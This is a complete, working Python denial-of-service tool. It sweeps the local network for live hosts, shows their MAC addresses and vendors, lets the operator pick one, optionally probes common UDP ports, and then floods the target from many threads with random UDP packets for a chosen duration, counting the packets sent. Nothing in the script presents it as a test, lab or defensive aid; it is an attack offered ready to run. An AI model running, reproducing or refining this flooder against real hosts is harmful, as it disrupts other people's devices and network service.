#!/usr/bin/env python3
import argparse
import threading
import socket
import random
import sys
import time
import subprocess
import errno
from concurrent.futures import ThreadPoolExecutor, as_completed

from tqdm import tqdm
from manuf import manuf

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()

def ping_host(ip: str) -> bool:
    return subprocess.run(
        ["ping", "-c", "1", "-W", "1", ip],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    ).returncode == 0

def scan_lan() -> list[str]:
    local_ip = get_local_ip()
    if not local_ip:
        print("[-] Cannot determine local IP; check connectivity.")
        sys.exit(1)

    parts = local_ip.split(".")[:3]
    base = ".".join(parts) + "."
    ips = [base + str(i) for i in range(1, 255) if base + str(i) != local_ip]
    live = []

    with ThreadPoolExecutor(max_workers=100) as exe:
        futures = {exe.submit(ping_host, ip): ip for ip in ips}
        for f in tqdm(as_completed(futures),
                      total=len(ips),
                      desc="Scanning LAN",
                      unit="host"):
            if f.result():
                live.append(futures[f])

    return sorted(live, key=lambda ip: list(map(int, ip.split("."))))

def resolve_vendors(hosts: list[str]) -> list[tuple[str,str,str]]:
    # run `ip neigh` once to build a map ip→mac
    proc = subprocess.run(["ip", "neigh"], capture_output=True, text=True)
    neigh = {}
    for line in proc.stdout.splitlines():
        parts = line.split()
        if len(parts) >= 5 and parts[2] == "lladdr":
            neigh[parts[0]] = parts[4]
    parser = manuf.MacParser()
    results = []
    for ip in hosts:
        mac = neigh.get(ip, "??:??:??:??:??:??")
        vendor = parser.get_manuf(mac) or "Unknown"
        results.append((ip, mac, vendor))
    return results

def probe_udp_port(ip: str, port: int, timeout: float = 1.0) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(b"\x00", (ip, port))
        try:
            sock.recvfrom(1024)
            return True
        except socket.timeout:
            return True
        except socket.error as e:
            return False if e.errno == errno.ECONNREFUSED else True
    finally:
        sock.close()

def pick_best_udp_port(ip: str) -> int:
    for p in [53,161,123,500,67,68]:
        print(f"[*] Probing UDP/{p}… ", end="", flush=True)
        if probe_udp_port(ip, p):
            print("open/filtered")
            return p
        print("closed")
    print("[!] None responded; defaulting to random ports (0).")
    return 0

def flood_thread(ip, port, size, deadline, idx, iface, counts):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
        if iface:
            sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode()+b"\0")
    except:
        pass

    payload = random._urandom(size)
    sent = 0
    rnd = random.randint
    dst = (ip, port)
    while time.time() < deadline:
        for _ in range(64):
            try:
                if port == 0:
                    sock.sendto(payload, (ip, rnd(1,65535)))
                else:
                    sock.sendto(payload, dst)
                sent += 1
            except:
                pass
    counts[idx] = sent

def main():
    parser = argparse.ArgumentParser(
        description="LAN scan → auto-UDP-port pick → high-rate UDP flood"
    )
    parser.add_argument("--packet-size", "-s", type=int, help="bytes per packet")
    parser.add_argument("--duration", "-d", type=int, help="flood duration (sec)")
    parser.add_argument("--threads", "-t", type=int, help="number of threads")
    parser.add_argument("--iface", "-i", default="", help="interface to bind (e.g. wlan0)")
    parser.add_argument("--autoport", action="store_true", help="probe common UDP ports")
    args = parser.parse_args()

    # 1) Scan LAN & show vendors
    hosts = scan_lan()
    info = resolve_vendors(hosts)
    print("\nLive hosts:")
    for idx, (ip, mac, vendor) in enumerate(info, 1):
        print(f"  {idx:3d}) {ip:16s}  {mac}  {vendor}")

    sel = int(input(f"Select target (1–{len(info)}): ").strip()) - 1
    target_ip = info[sel][0]

    # 2) Port selection
    if args.autoport:
        port = pick_best_udp_port(target_ip)
    else:
        port = 0  # random each send

    # 3) Packet size
    if args.packet_size is None:
        args.packet_size = int(input("Packet size (bytes): ").strip())
    # 4) Duration
    if args.duration is None:
        args.duration = int(input("Duration (sec): ").strip())
    # 5) Threads
    if args.threads is None:
        args.threads = int(input("Threads: ").strip())
    iface = args.iface or None

    print(f"\n[*] Flooding {target_ip}:{port}  size={args.packet_size}  dur={args.duration}s  "
          f"threads={args.threads}  iface={iface or 'default'}")

    # 6) Launch flood + progress bar
    deadline = time.time() + args.duration
    counts = [0] * args.threads
    for i in range(args.threads):
        threading.Thread(
            target=flood_thread,
            args=(target_ip, port, args.packet_size, deadline, i, iface, counts),
            daemon=True
        ).start()

    for _ in tqdm(range(args.duration), desc="Flooding", unit="s"):
        time.sleep(1)

    total = sum(counts)
    print("\n[*] Flood complete.")
    for idx, c in enumerate(counts, 1):
        print(f"  Thread {idx}: {c} packets")
    print(f"  Total packets sent: {total:,}")

if __name__ == "__main__":
    main()
